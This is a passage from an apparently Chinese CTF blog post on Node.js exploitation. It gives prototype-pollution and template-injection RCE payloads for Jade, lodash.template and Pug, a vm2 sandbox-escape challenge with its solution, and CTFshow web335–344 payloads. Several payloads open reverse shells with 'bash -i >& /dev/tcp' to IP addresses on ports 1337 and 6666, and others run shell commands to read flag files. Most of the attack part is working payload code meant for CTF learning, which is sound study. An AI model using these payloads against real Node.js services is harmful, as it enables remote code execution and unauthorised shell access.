+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;console.log(global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;))&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">直接在函数内部执行。</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;self&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/123.57.107.33/1337 0&gt;&amp;1\&quot;&#x27;);//&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>, <span class="string">&quot;&quot;</span> ));<span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/124.222.136.33/1337 0&gt;&amp;1&quot;&#x27;</span>);<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">先闭合，然后再执行，后面注释掉。</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;self&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);//&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="lodash-template"><a href="#lodash-template" class="headerlink" title="lodash.template"></a>lodash.template</h3><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\u000aglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;dir&#x27;,function()&#123;&#125;);&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\u000areturn e =&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PugJs"><a href="#PugJs" class="headerlink" title="PugJs"></a>PugJs</h3><h4 id="SSTI-2"><a href="#SSTI-2" class="headerlink" title="SSTI"></a>SSTI</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat+f*&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11305#toc-5">NodeJS VM和VM2沙箱逃逸-先知社区</a></p>
+<h3 id="hznuCTF-eznode"><a href="#hznuCTF-eznode" class="headerlink" title="hznuCTF eznode"></a>hznuCTF eznode</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>明显看到 <code>clone</code> 是原型链污染，如果 <code>shit</code> 为真，沙箱执行了 <code>shellcode</code> 这个操作，不难让我们想到沙箱逃逸。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;shit&quot;</span>:<span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&quot;let res = import(&#x27;./foo.js&#x27;);res.toString.constructor(\&quot;return this\&quot;)().process.mainModule.require(\&quot;child_process\&quot;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/6666 0&gt;&amp;1\&quot;&#x27;).toString();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里首先我们导入模块获得一个对象，然后我们获取他 <code>toString</code> 的方法，这个方法的构造函数肯定是 <code>Function</code> 这里我们可以直接构造 <code>return this</code> 并执行获得 <code>global(全局对象，在沙箱中不逃逸是不存在的)</code></p>
+<h2 id="CTFSHOW例题"><a href="#CTFSHOW例题" class="headerlink" title="CTFSHOW例题"></a>CTFSHOW例题</h2><h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>payload：<code>?eval=require(&#39;child_process&#39;).execSync(&#39;cat f*&#39;)</code></p>
+<h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>payload：<code>?eval=require( &#39;child_process&#39; ).spawnSync( &#39;cat&#39;, [ &#39;fl00g.txt&#39; ] ).stdout.toString()</code></p>
+<p><code>?eval=require(&#39;child_process&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat f*&#39;)</code></p>
+<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><p>payload：<code>?a[1]=1&amp;b[1]=1</code></p>
+<h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web339-web343"><a href="#web339-web343" class="headerlink" title="web339-web343"></a>web339-web343</h3><p>jade，ejs 到 rce。</p>
+<h3 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h3><p>payload：<code>?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true}</code></p>
+<p><strong>node js 绕过逗号过滤。</strong></p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2026/02/01/attachment_cutter2/">attachment_cutter2</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/12/30/JWT/">JWT</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Zimo</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Node-js"><span class="toc-text">Node js</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%89%B9%E6%80%A7"><span class="toc-text">代码特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Function"><span class="toc-text">Function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">逗号的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E5%8C%96%E7%BB%95%E8%BF%87"><span class="toc-text">大小写转化绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#replace-%E7%89%B9%E6%80%A7"><span class="toc-text">replace 特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2%E4%B8%80%E6%AC%A1"><span class="toc-text">替换一次</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="toc-text">特定字符替换</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url-parse-%E7%89%B9%E6%80%A7"><span class="toc-text">url.parse 特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%A7%A3%E6%9E%90%E6%96%B9%E5%BC%8F"><span class="toc-text">HTTP解析方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90%E6%96%B9%E5%BC%8F"><span class="toc-text">参数解析方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E6%9D%BE%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="toc-text">宽松的解析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#require-%E5%87%BD%E6%95%B0%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-text">require 函数的妙用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parseInt%E5%A6%99%E7%94%A8"><span class="toc-text">parseInt妙用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Express%E8%A7%A3%E6%9E%90%E5%8F%82%E6%95%B0%E4%B8%8A%E9%99%90"><span class="toc-text">Express解析参数上限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-payload"><span class="toc-text">RCE payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">纯代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI"><span class="toc-text">SSTI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%87%BD%E6%95%B0-merge-copy-clone"><span class="toc-text">原型链污染函数 merge&#x2F;copy&#x2F;clone</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E6%9E%90-proto-%E4%B8%8E-prototype"><span class="toc-text">浅析 __proto__ 与 prototype</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E5%B7%A7%E5%A6%99%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BE%8B%E9%A2%98"><span class="toc-text">一道巧妙的原型链污染例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF-Tricks"><span class="toc-text">常见模板 Tricks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EJS"><span class="toc-text">EJS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI-1"><span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1"><span class="toc-text">原型链污染</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jade"><span class="toc-text">Jade</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lodash-template"><span class="toc-text">lodash.template</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PugJs"><span class="toc-text">PugJs</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI-2"><span class="toc-text">SSTI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">vm沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hznuCTF-eznode"><span class="toc-text">hznuCTF eznode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution"><span class="toc-text">Solution</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFSHOW%E4%BE%8B%E9%A2%98"><span class="toc-text">CTFSHOW例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web335"><span class="toc-text">web335</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web336"><span class="toc-text">web336</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web337"><span class="toc-text">web337</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web338"><span class="toc-text">web338</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web339-web343"><span class="toc-text">web339-web343</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web344"><span class="toc-text">web344</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
